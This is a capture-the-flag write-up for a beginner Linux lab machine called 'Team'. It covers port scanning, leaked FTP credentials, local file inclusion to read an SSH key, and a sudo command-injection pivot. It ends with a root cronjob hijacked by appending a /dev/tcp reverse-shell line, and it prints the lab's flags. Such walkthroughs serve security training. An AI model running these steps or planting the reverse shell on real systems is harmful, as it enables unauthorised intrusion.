# Team Writeup

> Machine : Linux

> Beginner friendly boot2root machine

## Solution

First connect to the machine.

> Deployed
> 
> No answer needed

Then reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.130.172.107 -p-
```

From our result we can see there is three open ports 21 (FTP), 22 (SSH) and 80 (HTTP).

Visiting the web on port 80, we found the Apache default page.
Viewing the source code we can see something interesting:

```html
It works! If you see this add 'team.thm' to your hosts!</title>
```

This means we have to add `team.thm` in our `/etc/hosts` file.

```shell
nano /etc/hosts
```

```text
127.0.0.1       localhost
127.0.1.1       kali
10.130.172.107  team.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now let's find the directories in this domain using `gobuster`.

```shell
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirb/common.txt
```

The only interesting thing is the `/scripts/` directory.

```text
scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
```

If we try to enter this directory we get `You don't have permission to access this resource.` so let's find out if we can access within the directory.

```shell
gobuster dir -u "http://team.thm/scripts/" -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
script.txt           (Status: 200) [Size: 597]
```

```shell
wget http://team.thm/scripts/script.txt
```

```shell
cat script.txt
```

```text
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

From the comments we can understand that there is an old version of this script that has creds on it.
We also know that a file with the **`.old`** extension is a previous version of a file that a system or application renamed to keep it safe when a newer version was created.

```shell
wget http://team.thm/scripts/script.old
```

```shell
cat script.old
```

```text
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

Now we have the creds to enter `FTP`.

```shell
ftp team.thm
Name: ftpuser
Password: T3@m$h@r3
```

```shell
ftp> ls
229 Entering Extended Passive Mode (|||46232|)
^C
receive aborted. Waiting for remote to finish abort.
ftp>  
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> 
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
ftp> 
ftp> cd workshare
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxr-xr-x    1 1002     1002          269 Jan 15  2021 New_site.txt
226 Directory send OK.
ftp> mget *
mget New_site.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
100% |************************************************************************************************************************************************|   269      333.36 KiB/s    00:00 ETA
226 Transfer complete.
269 bytes received in 00:00 (6.12 KiB/s)
ftp> bye
221 Goodbye.
```

```shell
cat New_site.txt
```

```text
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

We can understand that there is a subdomain named `dev` within `team.thm`.
Also we know there is an `id_rsa` in a config file.

First we have to add the subdomain to our hosts file.

```shell
nano /etc/hosts
```

```text
127.0.0.1       localhost
127.0.1.1       kali
10.130.172.107  team.thm        dev.team.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Upon accessing the subdomain `http://dev.team.thm/` and clicking the `team share link`, we discovered something interesting: the URL appears to be vulnerable to LFI (Local File Inclusion).

If we change the URL and write `http://dev.team.thm/script.php?page=/etc/passwd`, we can read the passwd file.

We must now specify the exact path to the `id_rsa` file we referred to.

We know it's a ssh config file so i will use `wfuzz` to fuzzing the common paths.

```shell
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0 | grep -i "ssh"
```

After some tries we found.

```text
000000082:   200        169 L    449 W      6013 Ch     "/etc/ssh/sshd_config"
```

Browsing it we found the `id_rsa` for Dale user at the end of the file. So we have to copy it in our machine and remove the hash symbol `#`, then change the permissions to 600 to use the `id_rsa` successfully.

```shell
nano id_rsa
```

```shell
sed -i 's/^.//' id_rsa
```

```shell
chmod 600 id_rsa
```

```shell
ssh dale@team.thm -i id_rsa
```

```shell
cat user.txt 
```

```text
THM{6Y0TXHz7c2d}
```

> user.txt
> 
> THM{6Y0TXHz7c2d}

```shell
sudo -l
```

```text
(gyles) NOPASSWD: /home/gyles/admin_checks
```

We can run `admin_checks` as user `gyles` without password.

```shell
cat /home/gyles/admin_checks
```

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

From the script we can see a vulnerability: We can enter a command as input and it runs with `gyles` permissions.

```bash
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

So let's use it to run `/bin/bash` and get a shell.

```shell
sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: 
Enter 'date' to timestamp the file: /bin/bash
The Date is 
```

```shell
id
```

```text
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

We have to improve the shell first:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")' ; export TERM=xterm
```

After searching in the common directories we found `/opt/admin_stuff/script.sh`.

```shell
cat /opt/admin_stuff/script.sh
```

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

It is a `cronjob` script; if we manage to modify the file, it will execute every minute with the privileges of the file's creator.

```shell
ls -la /usr/local/bin/main_backup.sh
```

```text
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

We can modify the file because `gyles` are members of the `admin group`. So we add a reverse shell then it will be execute every minute with the root privileges.

```shell
echo "sh -i >& /dev/tcp/192.168.133.12/4040 0>&1" >> /usr/local/bin/main_backup.sh
```

Then listing for connection.

```shell
nc -lnvp 4040
```

And after a minute we get a shell

```shell
whoami
```

```text
root
```

```shell
cat root.txt
```

```text
THM{fhqbznavfonq}
```

> root.txt
> 
> THM{fhqbznavfonq}

